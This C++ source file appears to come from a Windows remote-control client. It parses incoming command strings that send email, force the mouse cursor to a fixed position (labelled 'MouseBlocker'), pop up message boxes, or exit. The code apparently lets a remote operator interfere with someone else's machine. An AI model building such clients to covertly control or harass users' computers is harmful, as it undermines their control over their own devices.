#include "command.h"
#include "client.h"


/*Converts command and directs them to proper functions*/
void Command::execCommand()
{
	std::string prepos;
	prepos = _cmd.substr(0, 2);
	_cmd.erase(0, 2);
	if (DEBUG)
	{
		//std::cout << "\nPrepos: " << prepos << std::endl;
		//std::cout << "CMD: " << _cmd << std::endl;
	}

				/*V DIRECTOR V*/
	if (prepos.compare("1$") == 0) //MailSender gets format: 1$title##msg@@address
	{
		if (DEBUG)
			std::cout << "Mailing...\n";
		std::string address = getAddress(_cmd);
		std::string msg = getMessage(_cmd, true);
		std::string title = getTitle(_cmd);
		if (DEBUG)
			std::cout << "Title: " << title << "\nMsg: " << msg << "\nAddress: " << address << std::endl;
		mail(address.c_str(), title.c_str(), msg.c_str());
	}
	else if (prepos.compare("2$") == 0) //Mouseblocker gets format: 2$X..Y
	{
		if (DEBUG)
			std::cout << "MouseBlocker...\n";
		int x = getCursorX(_cmd);
		int y = getCursorY(_cmd);
			SetCursorPos(x, y);
	}
	else if (prepos.compare("3$") == 0) //MessageSender gets format: 3$title##msg
	{
		if (DEBUG)
			std::cout << "Message..\n";

		std::string msg = getMessage(_cmd, false);
		std::string title = getTitle(_cmd);
		
		MessageBox(NULL, msg.c_str() , title.c_str(), MB_ICONINFORMATION | MB_OKCANCEL);
	}
	else if (prepos.compare("$$") == 0)
	{
		exit(0);
	}
	/*else
	{
		if (DEBUG)
			std::cout << "Command is invalid!\n";
	}*/

}

/*Returns position of double repeat of 'code'.
example:
cmd = "test##blabla"
returns 4
*/
int Command::getSeparation(std::string cmd, std::string code)
{
std::string temp_str;
std::string temp_str2;
	if (cmd.length() != 0)
	{
		for (int i = 0; i < cmd.length()-1; i++)
		{
			temp_str = cmd.at(i);
			temp_str2 = cmd.at(i + 1);
			if (temp_str.compare(code) == 0 && temp_str2.compare(code) == 0)
			{
				return i;
			}
		}
		if (DEBUG)
			std::cout << "Only title in command\n";
		return 0;
	}
	else
	{
		if (DEBUG)
			std::cout << "Cmd.length = 0!\n";
		return 0;
	}
}

std::string Command::getTitle(std::string cmd)
{
int separator_pos;
if ((separator_pos = getSeparation(cmd, "#")) != 0)
	{
		if (DEBUG)
			std::cout << "getTitle: getSeparation # returned: " << separator_pos << std::endl;

		return cmd.substr(0, separator_pos);
	}
	else return cmd;
}

std::string Command::getMessage(std::string cmd, bool address)
{
int separator_pos; //##
int address_separator_pos; //@@

	if((separator_pos = getSeparation(cmd, "#")) != 0)
	{
		separator_pos += 2; //2 cuz of ##
		if (DEBUG)
			std::cout << "getMessage: getSeparation # returned: " << separator_pos << std::endl;
		if (!address)
		{
			return cmd.substr(separator_pos, (cmd.length() - separator_pos));
		}
		else
		{
			address_separator_pos = getSeparation(cmd, "@");
			return cmd.substr(separator_pos, address_separator_pos - separator_pos);
		}
	}
	else return cmd; //message = title
}

std::string Command::getAddress(std::string cmd)
{
int address_separator_pos; //@@

	address_separator_pos = getSeparation(cmd, "@") + 2;//2 cuz of @@

	if (DEBUG)
		std::cout << "getAddress: getSeparation # returned: " << address_separator_pos << std::endl;


		return cmd.substr(address_separator_pos, (cmd.length() - address_separator_pos));
}

int Command::getCursorX(std::string cmd)
{
	std::string temp = cmd.substr(0, getSeparation(cmd, "."));

	if (DEBUG)
		std::cout << "x = " << atoi(temp.c_str()) << std::endl;
	return atoi(temp.c_str());
}

int Command::getCursorY(std::string cmd)
{
int separator_pos = getSeparation(cmd, ".") + 2;	//2 cuz of ..

	std::string temp = cmd.substr(separator_pos, cmd.length() - separator_pos); 

	if (DEBUG)
		std::cout << "x = " << atoi(temp.c_str()) << std::endl;
	return atoi(temp.c_str());
}